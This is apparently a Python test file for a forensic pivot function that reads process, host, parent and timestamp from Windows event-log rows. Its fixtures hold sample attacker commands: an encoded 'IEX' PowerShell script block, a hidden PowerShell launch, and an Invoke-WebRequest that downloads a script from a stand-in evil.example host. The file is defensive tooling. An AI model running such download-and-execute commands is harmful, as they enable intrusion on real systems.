"""The 'what launched this?' anchor read off a row, whatever artefact wrote the row."""
from fireblade.core.pivot import anchor_of


def evtx_powershell():
    headers = ['TimeCreated', 'EventId', 'Computer', 'ScriptBlockText', 'Channel']
    values = ['2026-11-17 10:04:12', 4104, 'SRV-DC01',
              'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=', 'PowerShell']
    return anchor_of(headers, values)


def test_a_script_block_pivot_names_the_process_and_the_moment():
    anchor = evtx_powershell()
    assert anchor['token'] == 'powershell.exe'
    assert anchor['host'] == 'SRV-DC01'
    assert anchor['moment'].startswith('2026-11-17 10:04')


def test_a_process_creation_row_gives_the_image_and_the_parent():
    headers = ['TimeCreated', 'Computer', 'NewProcessName', 'CreatorProcessName', 'CommandLine']
    values = ['2026-11-17 10:04:00', 'PC-COMPTA',
              'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              'C:\\Windows\\explorer.exe', 'powershell.exe -nop -w hidden']
    anchor = anchor_of(headers, values)
    assert anchor['token'] == 'powershell.exe'
    assert anchor['parent'].endswith('explorer.exe')
    assert anchor['host'] == 'PC-COMPTA'


def test_a_sysmon_row_with_an_image_only_still_pivots():
    headers = ['UtcTime', 'Image', 'ParentImage', 'Computer']
    values = ['2026-11-17 10:03:55', 'C:\\Windows\\System32\\cmd.exe',
              'C:\\Windows\\System32\\powershell.exe', 'SRV-DC01']
    anchor = anchor_of(headers, values)
    assert anchor['token'] == 'cmd.exe'


def test_a_row_without_a_process_is_not_pivotable():
    assert anchor_of(['User', 'Action'], ['alice', 'login']) is None
    assert anchor_of(['Image'], ['']) is None


def test_a_command_line_without_a_path_names_its_first_word():
    anchor = anchor_of(['Computer', 'CommandLine'],
                       ['SRV01', 'Invoke-WebRequest -Uri http://evil.example/a.ps1'])
    assert anchor['token'] == 'Invoke-WebRequest'
    assert anchor['host'] == 'SRV01'
